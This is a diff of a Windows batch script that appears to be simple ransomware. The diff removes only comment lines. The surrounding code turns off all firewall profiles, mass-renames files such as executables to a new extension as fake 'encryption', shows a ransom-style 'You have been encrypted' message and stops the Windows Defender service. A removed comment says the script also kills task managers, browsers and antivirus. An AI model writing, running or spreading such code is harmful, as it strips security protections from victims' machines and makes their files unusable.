@@ -1,7 +1,6 @@
 @echo off
 title %random% %date% %username% %time% %random%
 color 0a
-ren -=- Writes INFO to a .LOG file in Current Directory -=-
 :info
 cls & color 0a
 cd Desktop
@@ -44,7 +43,6 @@ netsh advfirewall set privateprofile state off
 netsh advfirewall set publicprofile state off
 netsh advfirewall set allprofiles state off
 goto encryption
-ren -=- Encrypts files with a simple name break -=-
 :encryption
 cls & color 0a
 :Current
@@ -98,7 +96,6 @@ REN *.exe *.3hxD
 color 0a & mode 1000 & cls
 pause
 goto virus
-ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
 :virus
 ECHO You have been encrypted by *-*7_SL*- & color 0a
 net stop "Windows Defender Service"
